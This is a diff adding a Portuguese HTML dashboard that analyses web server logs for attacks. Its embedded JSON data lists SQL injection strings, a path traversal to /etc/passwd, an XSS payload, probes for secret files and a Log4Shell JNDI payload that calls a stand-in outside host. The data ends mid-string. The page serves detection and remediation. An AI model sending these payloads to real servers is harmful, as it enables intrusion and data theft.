@@ -1,0 +1,735 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Painel de Ataques</title>
+<style>
+:root {
+  color-scheme: light;
+  --page: #f9f9f7;
+  --surface: #fcfcfb;
+  --surface-2: #f1f0ec;
+  --ink: #0b0b0b;
+  --ink-2: #52514e;
+  --muted: #898781;
+  --grid: #e1e0d9;
+  --axis: #c3c2b7;
+  --border: rgba(11, 11, 11, 0.10);
+  --series-1: #2a78d6;
+  --link: #1c5cab;
+  --good: #0ca30c;
+  --warning: #fab219;
+  --serious: #ec835a;
+  --critical: #d03b3b;
+  --crit-wash: rgba(208, 59, 59, 0.07);
+  --good-wash: rgba(12, 163, 12, 0.07);
+  --warn-wash: rgba(250, 178, 25, 0.10);
+  --recon: #c3c2b7;
+  --flash: rgba(42, 120, 214, 0.16);
+  --sans: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  --mono: ui-monospace, "SF Mono", "Cascadia Code", Menlo, Consolas, monospace;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    color-scheme: dark;
+    --page: #0d0d0d;
+    --surface: #1a1a19;
+    --surface-2: #232321;
+    --ink: #ffffff;
+    --ink-2: #c3c2b7;
+    --muted: #898781;
+    --grid: #2c2c2a;
+    --axis: #383835;
+    --border: rgba(255, 255, 255, 0.10);
+    --series-1: #3987e5;
+    --link: #86b6ef;
+    --crit-wash: rgba(208, 59, 59, 0.14);
+    --good-wash: rgba(12, 163, 12, 0.12);
+    --warn-wash: rgba(250, 178, 25, 0.12);
+    --recon: #5d5c57;
+    --flash: rgba(57, 135, 229, 0.24);
+  }
+}
+:root[data-theme="dark"] {
+  color-scheme: dark;
+  --page: #0d0d0d;
+  --surface: #1a1a19;
+  --surface-2: #232321;
+  --ink: #ffffff;
+  --ink-2: #c3c2b7;
+  --muted: #898781;
+  --grid: #2c2c2a;
+  --axis: #383835;
+  --border: rgba(255, 255, 255, 0.10);
+  --series-1: #3987e5;
+  --link: #86b6ef;
+  --crit-wash: rgba(208, 59, 59, 0.14);
+  --good-wash: rgba(12, 163, 12, 0.12);
+  --warn-wash: rgba(250, 178, 25, 0.12);
+  --recon: #5d5c57;
+  --flash: rgba(57, 135, 229, 0.24);
+}
+
+* { box-sizing: border-box; }
+html { -webkit-text-size-adjust: 100%; }
+body {
+  margin: 0;
+  background: var(--page);
+  color: var(--ink);
+  font: 14px/1.5 var(--sans);
+}
+a { color: var(--link); }
+h1, h2, h3 { margin: 0; line-height: 1.25; }
+h1 { font-size: 22px; font-weight: 650; }
+h2 { font-size: 15px; font-weight: 650; }
+h3 { font-size: 13px; font-weight: 650; color: var(--ink-2); text-transform: uppercase; letter-spacing: .04em; }
+p { margin: 0; }
+.mono { font-family: var(--mono); font-size: 12.5px; }
+.muted { color: var(--muted); }
+.sub { color: var(--ink-2); }
+
+.wrap { max-width: 1180px; margin: 0 auto; padding: 24px 16px 48px; }
+.top { display: flex; gap: 16px; align-items: flex-start; justify-content: space-between; margin-bottom: 20px; }
+.top > div { min-width: 0; }
+.back { display: inline-block; margin-bottom: 10px; font-size: 13px; }
+.eyebrow { color: var(--muted); font-size: 12px; text-transform: uppercase; letter-spacing: .06em; margin-bottom: 4px; }
+.meta { color: var(--ink-2); margin-top: 6px; overflow-wrap: anywhere; }
+.meta span + span::before { content: "·"; margin: 0 8px; color: var(--muted); }
+
+button {
+  font: inherit; color: inherit; cursor: pointer;
+  background: var(--surface); border: 1px solid var(--border); border-radius: 8px;
+  padding: 6px 12px;
+}
+button:hover { background: var(--surface-2); }
+button:focus-visible, a:focus-visible, input:focus-visible, select:focus-visible, [tabindex]:focus-visible {
+  outline: 2px solid var(--series-1); outline-offset: 2px;
+}
+#theme { white-space: nowrap; flex-shrink: 0; }
+
+.card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 18px 20px;
+  margin-bottom: 16px;
+  min-width: 0;
+}
+.card-head { margin-bottom: 14px; }
+.card-head p { color: var(--ink-2); margin-top: 4px; }
+.grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 16px; }
+.grid-2 > .card { margin-bottom: 0; }
+
+/* Veredito */
+.verdict { border-left: 4px solid var(--critical); background: var(--crit-wash); }
+.verdict.alto, .verdict.medio { border-left-color: var(--serious); background: var(--warn-wash); }
+.verdict.baixo { border-left-color: var(--good); background: var(--good-wash); }
+.verdict h2 { font-size: 18px; margin: 8px 0 6px; }
+.verdict p { color: var(--ink-2); max-width: 80ch; overflow-wrap: anywhere; }
+.verdict .actions { margin-top: 12px; display: flex; gap: 8px; flex-wrap: wrap; }
+
+/* Badges de risco: ponto colorido + texto (cor nunca sozinha) */
+.badge {
+  display: inline-flex; align-items: center; gap: 6px;
+  padding: 2px 9px 2px 7px; border-radius: 999px;
+  border: 1px solid var(--border); background: var(--surface);
+  font-size: 12px; font-weight: 600; white-space: nowrap; color: var(--ink);
+}
+.badge::before { content: ""; width: 8px; height: 8px; border-radius: 50%; background: var(--dot, var(--muted)); }
+.badge.critico { --dot: var(--critical); }
+.badge.alto { --dot: var(--serious); }
+.badge.medio { --dot: var(--warning); }
+.badge.baixo { --dot: var(--good); }
+.tag {
+  display: inline-block; padding: 1px 7px; border-radius: 6px;
+  background: var(--surface-2); color: var(--ink-2); font-size: 12px; white-space: nowrap;
+}
+
+/* KPIs */
+.kpis { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 12px; margin-bottom: 16px; }
+.kpi { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 14px 16px; }
+.kpi .label { color: var(--ink-2); font-size: 12.5px; }
+.kpi .value { font-size: 28px; font-weight: 650; margin-top: 2px; }
+.kpi .note { color: var(--muted); font-size: 12px; }
+
+/* Tabelas */
+.table-wrap { overflow-x: auto; margin: 0 -4px; }
+table { width: 100%; border-collapse: collapse; }
+th, td { text-align: left; padding: 9px 8px; border-bottom: 1px solid var(--grid); vertical-align: top; }
+th { color: var(--muted); font-weight: 600; font-size: 12px; white-space: nowrap; }
+td.num, th.num { text-align: right; font-variant-numeric: tabular-nums; }
+tbody tr { cursor: pointer; }
+tbody tr:hover { background: var(--surface-2); }
+.ip-link {
+  font-family: var(--mono); font-size: 12.5px; color: var(--link);
+  background: none; border: 0; padding: 0; text-decoration: underline; text-underline-offset: 2px;
+  white-space: nowrap; text-align: left;
+}
+.seq-who .ip-link { white-space: normal; overflow-wrap: anywhere; }
+.ip-link:hover { background: none; }
+.why { color: var(--muted); font-size: 12px; margin-top: 2px; max-width: 42ch; overflow-wrap: anywhere; }
+
+/* Barras horizontais */
+.bars { display: grid; gap: 8px; }
+.bar-row { display: grid; grid-template-columns: minmax(60px, 140px) 1fr 28px minmax(0, 150px); gap: 10px; align-items: center; min-height: 24px; }
+.bar-row .name { font-family: var(--mono); font-size: 12.5px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.bar-track { position: relative; height: 20px; display: flex; align-items: center; }
+.bar-track::before { content: ""; position: absolute; left: 0; top: 2px; bottom: 2px; border-left: 1px solid var(--axis); }
+.bar { height: 10px; background: var(--series-1); border-radius: 0 4px 4px 0; min-width: 3px; }
+.bar-row .val { text-align: right; font-variant-numeric: tabular-nums; color: var(--ink-2); }
+.bar-row .flags { display: flex; gap: 6px; flex-wrap: wrap; }
+
+/* Alvo */
+.target-host { display: flex; gap: 12px; align-items: baseline; flex-wrap: wrap; }
+.target-host .big { font-family: var(--mono); font-size: 20px; font-weight: 600; overflow-wrap: anywhere; }
+.kv { display: grid; grid-template-columns: max-content 1fr; gap: 8px 16px; margin-top: 14px; }
+.kv dt { color: var(--muted); }
+.kv dd { margin: 0; min-width: 0; }
+.chips { display: flex; flex-wrap: wrap; gap: 6px; }
+
+/* Ferramentas, técnicas e correções */
+.split { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; }
+.item { padding: 12px 0; border-top: 1px solid var(--grid); }
+.item:first-of-type { border-top: 0; }
+.item-head { display: flex; gap: 8px; align-items: baseline; flex-wrap: wrap; }
+.item-head strong { font-size: 14px; }
+.item p { color: var(--ink-2); margin-top: 4px; overflow-wrap: anywhere; }
+.evidence { margin-top: 6px; display: flex; flex-wrap: wrap; gap: 4px; align-items: center; color: var(--muted); font-size: 12px; }
+.line-link {
+  font-family: var(--mono); font-size: 11.5px; padding: 1px 6px; border-radius: 6px;
+  background: var(--surface-2); border: 1px solid var(--border); color: var(--link);
+}
+.mitre { font-family: var(--mono); font-size: 12px; }
+.fix { padding: 16px 0; border-top: 1px solid var(--grid); }
+.fix:first-child { border-top: 0; padding-top: 0; }
+.fix ol { margin: 10px 0 0; padding-left: 20px; color: var(--ink); }
+.fix li { margin: 4px 0; }
+.code { position: relative; margin-top: 10px; }
+.code pre {
+  margin: 0; padding: 10px 12px; border-radius: 8px; background: var(--surface-2);
+  font: 12px/1.6 var(--mono); overflow-x: auto; white-space: pre;
+}
+.code button { position: absolute; top: 6px; right: 6px; padding: 2px 8px; font-size: 12px; }
+
+/* Sequência por IP */
+.legend { display: flex; gap: 16px; flex-wrap: wrap; color: var(--ink-2); font-size: 12.5px; margin-bottom: 14px; }
+.legend > span { display: inline-flex; align-items: center; gap: 6px; }
+.seq-row { display: grid; grid-template-columns: 190px 1fr; gap: 12px; padding: 10px 0; border-top: 1px solid var(--grid); align-items: start; }
+.seq-row:first-of-type { border-top: 0; }
+.seq-who { display: grid; gap: 4px; justify-items: start; min-width: 0; }
+.seq { display: flex; flex-wrap: wrap; gap: 3px; align-items: center; }
+.chip {
+  width: 20px; height: 20px; border-radius: 4px; border: 0; padding: 0;
+  display: inline-grid; place-items: center;
+  font: 700 11px/1 var(--sans); color: #0b0b0b; cursor: pointer;
+}
+.chip:hover { outline: 2px solid var(--ink); outline-offset: 1px; }
+.chip.failed, .chip.failed:hover { background: var(--serious); }
+.chip.accepted, .chip.accepted:hover { background: var(--good); }
+.chip.warn, .chip.warn:hover { background: var(--warning); }
+.chip.crit, .chip.crit:hover { background: var(--critical); color: #fff; box-shadow: 0 0 0 2px var(--surface), 0 0 0 4px var(--critical); margin: 0 4px; }
+.chip.recon, .chip.recon:hover { background: var(--recon); color: var(--ink); }
+.chip.static { cursor: default; }
+.limit { display: inline-flex; flex-direction: column; align-items: center; margin: 0 4px; height: 30px; justify-content: center; }
+.limit::before { content: ""; width: 2px; flex: 1; background: var(--ink); }
+.limit span { font-size: 10px; color: var(--ink-2); line-height: 1; margin-top: 2px; }
+.seq-sum { color: var(--muted); font-size: 12px; margin-top: 6px; }
+
+/* Log */
+.filters { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; margin-bottom: 12px; }
+.seg { display: inline-flex; flex-wrap: wrap; gap: 4px; }
+.seg button { padding: 4px 10px; border-radius: 999px; font-size: 12.5px; }
+.seg button[aria-pressed="true"] { background: var(--ink); color: var(--surface); border-color: var(--ink); }
+select, input[type="search"] {
+  font: inherit; color: var(--ink); background: var(--surface);
+  border: 1px solid var(--border); border-radius: 8px; padding: 5px 10px; min-width: 0; max-width: 100%;
+}
+input[type="search"] { flex: 1 1 200px; }
+.count { color: var(--muted); font-size: 12.5px; margin-bottom: 8px; }
+.log {
+  font-family: var(--mono); font-size: 12px; line-height: 1.55;
+  background: var(--surface-2); border-radius: 8px; padding: 6px 0;
+  max-height: 560px; overflow: auto;
+}
+.log-row { display: grid; grid-template-columns: 48px 104px 1fr; gap: 10px; padding: 2px 12px; }
+.log-row:hover { background: var(--flash); }
+.log-row.flash { animation: flash 1.6s ease-out; }
+@keyframes flash { from { background: var(--flash); box-shadow: inset 3px 0 0 var(--series-1); } to { background: transparent; } }
+.log-row .ln { color: var(--muted); text-align: right; user-select: none; }
+.log-row .txt { white-space: pre-wrap; word-break: break-word; }
+.k { font-family: var(--sans); font-size: 10.5px; font-weight: 700; letter-spacing: .03em; display: inline-flex; align-items: center; gap: 5px; color: var(--ink-2); white-space: nowrap; }
+.k::before { content: ""; width: 7px; height: 7px; border-radius: 2px; background: var(--kc, transparent); flex-shrink: 0; }
+.k.failed, .k.invalid_user, .k.attack, .k.login_fail { --kc: var(--serious); }
+.k.attack_ok { --kc: var(--warning); }
+.k.accepted, .k.session, .k.login_ok { --kc: var(--good); }
+.k.crit { --kc: var(--critical); color: var(--ink); }
+.k.recon { --kc: var(--recon); }
+.k.client { --kc: var(--series-1); }
+.hl-kw { font-weight: 700; }
+.hl-ip { color: var(--link); cursor: pointer; text-decoration: underline; text-underline-offset: 2px; }
+
+footer { color: var(--muted); font-size: 12.5px; margin-top: 24px; display: grid; gap: 6px; }
+
+#tip {
+  position: fixed; z-index: 10; pointer-events: none; max-width: 340px;
+  background: var(--ink); color: var(--surface); border-radius: 8px;
+  padding: 7px 10px; font-size: 12.5px; line-height: 1.4; white-space: pre-line; overflow-wrap: anywhere;
+  box-shadow: 0 4px 16px rgba(0, 0, 0, .18);
+}
+#tip[hidden] { display: none; }
+
+@media (max-width: 860px) {
+  .grid-2, .split { grid-template-columns: 1fr; }
+  .seq-row { grid-template-columns: 1fr; }
+}
+@media (max-width: 560px) {
+  .top { flex-direction: column; }
+  .bar-row { grid-template-columns: minmax(60px, 110px) 1fr 28px; }
+  .bar-row .flags { grid-column: 2 / 4; }
+  .bar-row .flags:empty { display: none; }
+  .log-row { grid-template-columns: 36px 1fr; }
+  .log-row .k { grid-column: 2; }
+  .log-row .txt { grid-column: 1 / 3; }
+  .kpi .value { font-size: 24px; }
+  .kv { grid-template-columns: 1fr; gap: 2px; }
+  .kv dd { margin-bottom: 8px; }
+}
+@media (forced-colors: active) {
+  .chip, .badge::before, .k::before { forced-color-adjust: none; }
+}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header class="top">
+    <div>
+      <div id="nav"></div>
+      <p class="eyebrow" id="eyebrow">Analisador de logs</p>
+      <h1>Painel de ataques</h1>
+      <p class="meta" id="meta"></p>
+    </div>
+    <button id="theme" type="button" aria-label="Alternar tema claro/escuro">◐ Tema</button>
+  </header>
+
+  <main>
+    <section class="card verdict" id="verdict" aria-live="polite"></section>
+    <section class="kpis" id="kpis" aria-label="Resumo"></section>
+
+    <section class="card">
+      <div class="card-head">
+        <h2>Origem dos ataques</h2>
+        <p>Quem atacou, com que ferramenta e com qual resultado. Clique numa linha para ver o log daquele IP.</p>
+      </div>
+      <div class="table-wrap"><table id="attackers"></table></div>
+    </section>
+
+    <div class="grid-2">
+      <section class="card">
+        <div class="card-head">
+          <h2>Alvo</h2>
+          <p id="target-sub"></p>
+        </div>
+        <div id="target"></div>
+      </section>
+      <section class="card">
+        <div class="card-head">
+          <h2 id="accounts-title"></h2>
+          <p id="accounts-sub"></p>
+        </div>
+        <div class="bars" id="accounts"></div>
+      </section>
+    </div>
+
+    <section class="card" id="fixes-card">
+      <div class="card-head">
+        <h2>Como corrigir</h2>
+        <p>O que fazer para cada tipo de ataque encontrado, do mais grave para o menos grave.</p>
+      </div>
+      <div id="fixes"></div>
+    </section>
+
+    <section class="card">
+      <div class="card-head">
+        <h2>Ferramentas e técnicas</h2>
+        <p>Inferidas do cliente usado e do comportamento. Cada item aponta as linhas do log que servem de evidência.</p>
+      </div>
+      <div class="split">
+        <div><h3>Ferramentas prováveis</h3><div id="tools"></div></div>
+        <div><h3>Técnicas (MITRE ATT&amp;CK)</h3><div id="techniques"></div></div>
+      </div>
+    </section>
+
+    <section class="card">
+      <div class="card-head">
+        <h2>Sequência de eventos por IP</h2>
+        <p id="seq-intro"></p>
+      </div>
+      <div class="legend" id="seq-legend"></div>
+      <div id="sequences"></div>
+    </section>
+
+    <section class="card" id="log-card">
+      <div class="card-head">
+        <h2>Log</h2>
+      </div>
+      <div class="filters">
+        <div class="seg" id="kind-filter" role="group" aria-label="Tipo de linha"></div>
+        <select id="ip-filter" aria-label="Filtrar por IP"></select>
+        <input type="search" id="search" placeholder="Buscar no log…" aria-label="Buscar no log">
+      </div>
+      <p class="count" id="log-count"></p>
+      <div class="log" id="log" tabindex="0" aria-label="Linhas do log"></div>
+    </section>
+  </main>
+
+  <footer>
+    <p>Use apenas em logs seus ou de laboratório.</p>
+    <p>"Ferramenta provável" é heurística: banner e user-agent podem ser falsificados. No SSH, o banner do cliente só aparece com <span class="mono">LogLevel DEBUG1</span> e a porta de destino com <span class="mono">LogLevel VERBOSE</span>.</p>
+  </footer>
+</div>
+<div id="tip" role="tooltip" hidden></div>
+
+<script id="data" type="application/json">{"kind":"web","hosts":[],"targets":[],"period":{"start":"27/Nov/2026:09:00:04 -0300","end":"27/Nov/2026:11:00:50 -0300"},"totals":{"lines":63,"events":63,"failed":28,"accepted":8,"ips":6,"bruteforce":1,"critical":2},"verdict":{"level":"critico","title":"Ataques com sucesso","text":"198.51.100.23 baixou /.env (resposta 200, 512 bytes). 203.0.113.50 errou a senha 8 vezes em /wp-login.php e depois entrou (Hydra).","actions":[{"label":"Ver no log (L19)","line":19},{"label":"Todas as linhas de 198.51.100.23","ip":"198.51.100.23"}]},"kpis":[{"label":"Requisições","value":63,"note":"63 linhas lidas"},{"label":"Ataques","value":28,"note":"44,4% das requisições"},{"label":"Ataques com 2xx","value":8,"note":"2 críticos"},{"label":"IPs de origem","value":6,"note":"5 suspeitos"},{"label":"Ferramentas de ataque","value":4,"note":"identificadas pelo user-agent"}],"alerts":[{"ip":"198.51.100.23","line":19},{"ip":"203.0.113.50","line":34}],"attackers":[{"ip":"198.51.100.23","risk":"critico","failed":8,"accepted":2,"users":["/.git/config","/.env","/backup.sql","/wp-config.php.bak","/phpinfo.php","/download.php","/busca","/server-status"],"first":"27/Nov/2026:09:35:34 -0300","last":"27/Nov/2026:09:35:36 -0300","period":"09:35:34 → 09:35:36","median_gap":0.0,"machine_pace":true,"software":{"software":"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:007500)","n":18},"tool":"Nikto","tool_basis":"user-agent \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:No…\": scanner de vulnerabilidades web","offensive_tool":true,"sessions":[],"techniques":[{"id":"T1190","evidence":[23,24]},{"id":"T1595.002","evidence":[18,19,20]},{"id":"T1595.003","evidence":[18,19,20,21,22]},{"id":"T1552.001","evidence":[19]}],"sequence":[{"k":"failed","crit":false,"n":18,"time":"27/Nov/2026:09:35:34 -0300","label":"Arquivo sensível · GET /.git/config → 404"},{"k":"warn","crit":true,"n":19,"time":"27/Nov/2026:09:35:34 -0300","label":"Arquivo sensível · GET /.env → 200"},{"k":"failed","crit":false,"n":20,"time":"27/Nov/2026:09:35:34 -0300","label":"Arquivo sensível · GET /backup.sql → 404"},{"k":"failed","crit":false,"n":21,"time":"27/Nov/2026:09:35:35 -0300","label":"Arquivo sensível · GET /wp-config.php.bak → 404"},{"k":"failed","crit":false,"n":22,"time":"27/Nov/2026:09:35:35 -0300","label":"Arquivo sensível · GET /phpinfo.php → 404"},{"k":"failed","crit":false,"n":23,"time":"27/Nov/2026:09:35:35 -0300","label":"Path traversal · GET /download.php?file=../../../../etc/passwd → 400"},{"k":"warn","crit":false,"n":24,"time":"27/Nov/2026:09:35:36 -0300","label":"XSS · GET /busca?q=%3Cscript%3Ealert%281%29%3C/script%3E → 200"},{"k":"failed","crit":false,"n":25,"time":"27/Nov/2026:09:35:36 -0300","label":"Arquivo sensível · GET /server-status → 403"}]},{"ip":"203.0.113.50","risk":"critico","failed":8,"accepted":1,"users":["/wp-login.php"],"first":"27/Nov/2026:10:05:37 -0300","last":"27/Nov/2026:10:05:44 -0300","period":"10:05:37 → 10:05:44","median_gap":1.0,"machine_pace":true,"software":{"software":"Mozilla/5.0 (Hydra)","n":26},"tool":"Hydra","tool_basis":"user-agent \"Mozilla/5.0 (Hydra)\": brute force de formulários de login","offensive_tool":true,"sessions":[],"techniques":[{"id":"T1595.002","evidence":[26,27,28]},{"id":"T1110.001","evidence":[26,27,28,29,30,31,32,33]},{"id":"T1078","evidence":[34]}],"sequence":[{"k":"failed","n":26,"time":"27/Nov/2026:10:05:37 -0300","count":1,"label":"Senha errada nº 1 · POST /wp-login.php → 200"},{"k":"failed","n":27,"time":"27/Nov/2026:10:05:38 -0300","count":2,"label":"Senha errada nº 2 · POST /wp-login.php → 200"},{"k":"failed","n":28,"time":"27/Nov/2026:10:05:38 -0300","count":3,"label":"Senha errada nº 3 · POST /wp-login.php → 200"},{"k":"failed","n":29,"time":"27/Nov/2026:10:05:39 -0300","count":4,"label":"Senha errada nº 4 · POST /wp-login.php → 200"},{"k":"failed","n":30,"time":"27/Nov/2026:10:05:40 -0300","count":5,"label":"Senha errada nº 5 · POST /wp-login.php → 200"},{"k":"failed","n":31,"time":"27/Nov/2026:10:05:41 -0300","count":6,"label":"Senha errada nº 6 · POST /wp-login.php → 200"},{"k":"failed","n":32,"time":"27/Nov/2026:10:05:42 -0300","count":7,"label":"Senha errada nº 7 · POST /wp-login.php → 200"},{"k":"failed","n":33,"time":"27/Nov/2026:10:05:42 -0300","count":8,"label":"Senha errada nº 8 · POST /wp-login.php → 200"},{"k":"accepted","crit":true,"n":34,"time":"27/Nov/2026:10:05:43 -0300","label":"LOGIN APÓS BRUTE FORCE · POST /wp-login.php → 302"}]},{"ip":"203.0.113.9","risk":"alto","failed":10,"accepted":5,"users":["/produto.php"],"first":"27/Nov/2026:09:20:30 -0300","last":"27/Nov/2026:09:20:34 -0300","period":"09:20:30 → 09:20:34","median_gap":0.0,"machine_pace":true,"software":{"software":"sqlmap/1.8.11#stable (https://sqlmap.org)","n":8},"tool":"sqlmap","tool_basis":"user-agent \"sqlmap/1.8.11#stable (https://sqlmap.or…\": ferramenta automática de SQL injection","offensive_tool":true,"sessions":[],"techniques":[{"id":"T1190","evidence":[8,9,10,11,12,13,14,15,16,17]},{"id":"T1595.002","evidence":[8,9,10]}],"sequence":[{"k":"failed","crit":false,"n":8,"time":"27/Nov/2026:09:20:30 -0300","label":"SQL injection · GET /produto.php?id=1%27 → 500"},{"k":"warn","crit":false,"n":9,"time":"27/Nov/2026:09:20:30 -0300","label":"SQL injection · GET /produto.php?id=1%20AND%201%3D1 → 200"},{"k":"failed","crit":false,"n":10,"time":"27/Nov/2026:09:20:31 -0300","label":"SQL injection · GET /produto.php?id=1%27%20OR%20%271%27%3D%271 → 500"},{"k":"warn","crit":false,"n":11,"time":"27/Nov/2026:09:20:31 -0300","label":"SQL injection · GET /produto.php?id=1%27%20OR%201%3D1--%20- → 200"},{"k":"failed","crit":false,"n":12,"time":"27/Nov/2026:09:20:32 -0300","label":"SQL injection · GET /produto.php?id=1%20UNION%20ALL%20SELECT%20NULL%2… → 500"},{"k":"warn","crit":false,"n":13,"time":"27/Nov/2026:09:20:32 -0300","label":"SQL injection · GET /produto.php?id=1%20UNION%20SELECT%20username%2Cp… → 200"},{"k":"failed","crit":false,"n":14,"time":"27/Nov/2026:09:20:32 -0300","label":"SQL injection · GET /produto.php?id=1%20AND%20SLEEP%285%29 → 500"},{"k":"warn","crit":false,"n":15,"time":"27/Nov/2026:09:20:33 -0300","label":"SQL injection · GET /produto.php?id=1%3BWAITFOR%20DELAY%20%270%3A0%3A… → 200"},{"k":"failed","crit":false,"n":16,"time":"27/Nov/2026:09:20:33 -0300","label":"SQL injection · GET /produto.php?id=1%20AND%20%28SELECT%201%20FROM%20… → 500"},{"k":"warn","crit":false,"n":17,"time":"27/Nov/2026:09:20:34 -0300","label":"SQL injection · GET /produto.php?id=1%27%3B%20DROP%20TABLE%20users-- → 200"}]},{"ip":"203.0.113.200","risk":"alto","failed":2,"accepted":1,"users":["/","/cgi-bin/status"],"first":"27/Nov/2026:10:55:48 -0300","last":"27/Nov/2026:10:55:49 -0300","period":"10:55:48 → 10:55:49","median_gap":1.0,"machine_pace":false,"software":{"software":"${jndi:ldap://198.51.100.99:1389/a}","n":61},"tool":"Exploit no user-agent","tool_basis":"payload de Log4Shell/Shellshock enviado no cabeçalho User-Agent","offensive_tool":false,"sessions":[],"techniques":[{"id":"T1190","evidence":[61,62]}],"sequence":[{"k":"warn","crit":false,"n":61,"time":"27/Nov/2026:10:55:48 -0300","label":"Execução de comando · GET / → 200"},{"k":"failed","crit":false,"n":62,"time":"27/Nov/2026:10:55:49 -0300","label":"Execução de comando · GET /cgi-bin/status → 404"}]},{"ip":"198.51.100.77","risk":"medio","failed":0,"accepted":0,"users":[],"first":"27/Nov/2026:10:15:44 -0300","last":"27/Nov/2026:10:15:47 -0300","period":"10:15:44 → 10:15:47","median_gap":0.0,"machine_pace":true,"software":{"software":"gobuster/3.6","n":36},"tool":"Gobuster","tool_basis":"user-agent \"gobuster/3.6\": descobre pastas testando uma lista de nomes","offensive_tool":true,"sessions":[],"techniques":[{"id":"T1595.002","evidence":[36,37,38]},{"id":"T1595.003","evidence":[36,37,38,39,40]}],"sequence":[{"k":"recon","n":36,"time":"27/Nov/2026:10:15:44 -0300","label":"404 · GET /admin → 404"},{"k":"recon","n":37,"time":"27/Nov/2026:10:15:44 -0300","label":"404 · GET /backup → 404"},{"k":"recon","n":38,"time":"27/Nov/2026:10:15:44 -0300","label":"404 · GET /old → 404"},{"k":"recon","n":39,"time":"27/Nov/2026:10:15:45 -0300","label":"404 · GET /test → 404"},{"k":"recon","n":40,"time":"27/Nov/2026:10:15:45 -0300","label":"404 · GET /dev → 404"},{"k":"recon","n":42,"time":"27/Nov/2026:10:15:45 -0300","label":"404 · GET /uploads → 404"},{"k":"recon","n":43,"time":"27/Nov/2026:10:15:45 -0300","label":"404 · GET /private → 404"},{"k":"recon","n":44,"time":"27/Nov/2026:10:15:45 -0300","label":"404 · GET /tmp → 404"},{"k":"recon","n":45,"time":"27/Nov/2026:10:15:45 -0300","label":"404 · GET /logs → 404"},{"k":"recon","n":46,"time":"27/Nov/2026:10:15:45 -0300","label":"404 · GET /config → 404"},{"k":"recon","n":47,"time":"27/Nov/2026:10:15:45 -0300","label":"404 · GET /db → 404"},{"k":"recon","n":48,"time":"27/Nov/2026:10:15:45 -0300","label":"404 · GET /phpmyadmin → 404"},{"k":"recon","n":49,"time":"27/Nov/2026:10:15:46 -0300","label":"404 · GET /cpanel → 404"},{"k":"recon","n":50,"time":"27/Nov/2026:10:15:46 -0300","label":"404 · GET /manager → 404"},{"k":"recon","n":51,"time":"27/Nov/2026:10:15:46 -0300","label":"404 · GET /console → 404"},{"k":"recon","n":52,"time":"27/Nov/2026:10:15:46 -0300","label":"404 · GET /staging → 404"},{"k":"recon","n":53,"time":"27/Nov/2026:10:15:46 -0300","label":"404 · GET /beta → 404"},{"k":"recon","n":54,"time":"27/Nov/2026:10:15:46 -0300","label":"404 · GET /v1 → 404"},{"k":"recon","n":55,"time":"27/Nov/2026:10:15:46 -0300","label":"404 · GET /v2 → 404"},{"k":"recon","n":56,"time":"27/Nov/2026:10:15:46 -0300","label":"404 · GET /includes → 404"},{"k":"recon","n":57,"time":"27/Nov/2026:10:15:46 -0300","label":"404 · GET /secret → 404"},{"k":"recon","n":58,"time":"27/Nov/2026:10:15:46 -0300","label":"404 · GET /dump → 404"},{"k":"recon","n":59,"time":"27/Nov/2026:10:15:47 -0300","label":"404 · GET /panel → 404"},{"k":"recon","n":60,"time":"27/Nov/2026:10:15:47 -0300","label":"404 · GET /dashboard → 404"}]},{"ip":"192.0.2.44","risk":"baixo","failed":0,"accepted":0,"users":[],"first":"27/Nov/2026:09:00:04 -0300","last":"27/Nov/2026:11:00:50 -0300","period":"09:00:04 → 11:00:50","median_gap":4.0,"machine_pace":false,"software":{"software":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36","n":1},"tool":"Navegador","tool_basis":"user-agent \"Mozilla/5.0 (Windows NT 10.0; Win64; x6…\": user-agent de navegador (pode ser falsificado)","offensive_tool":false,"sessions":[],"techniques":[],"sequence":[{"k":"accepted","crit":false,"n":6,"time":"27/Nov/2026:09:00:29 -0300","label":"Login aceito · POST /login → 302"}]}],"accounts":[{"name":"/produto.php","count":10,"flags":[{"text":"SQL injection"}],"tip":"/produto.php: 10 requisições maliciosas\nde 203.0.113.9"},{"name":"/wp-login.php","count":8,"flags":[{"text":"invadido","critical":true},{"text":"Senha errada"}],"tip":"/wp-login.php: 8 requisições maliciosas\nde 203.0.113.50"},{"name":"/.git/config","count":1,"flags":[{"text":"Arquivo sensível"}],"tip":"/.git/config: 1 requisição maliciosa\nde 198.51.100.23"},{"name":"/.env","count":1,"flags":[{"text":"exposto","critical":true},{"text":"Arquivo sensível"}],"tip":"/.env: 1 requisição maliciosa\nde 198.51.100.23"},{"name":"/backup.sql","count":1,"flags":[{"text":"Arquivo sensível"}],"tip":"/backup.sql: 1 requisição maliciosa\nde 198.51.100.23"},{"name":"/wp-config.php.bak","count":1,"flags":[{"text":"Arquivo sensível"}],"tip":"/wp-config.php.bak: 1 requisição maliciosa\nde 198.51.100.23"},{"name":"/phpinfo.php","count":1,"flags":[{"text":"Arquivo sensível"}],"tip":"/phpinfo.php: 1 requisição maliciosa\nde 198.51.100.23"},{"name":"/download.php","count":1,"flags":[{"text":"Path traversal"}],"tip":"/download.php: 1 requisição maliciosa\nde 198.51.100.23"},{"name":"/busca","count":1,"flags":[{"text":"XSS"}],"tip":"/busca: 1 requisição maliciosa\nde 198.51.100.23"},{"name":"/server-status","count":1,"flags":[{"text":"Arquivo sensível"}],"tip":"/server-status: 1 requisição maliciosa\nde 198.51.100.23"},{"name":"/","count":1,"flags":[{"text":"Execução de comando"}],"tip":"/: 1 requisição maliciosa\nde 203.0.113.200"},{"name":"/cgi-bin/status","count":1,"flags":[{"text":"Execução de comando"}],"tip":"/cgi-bin/status: 1 requisição 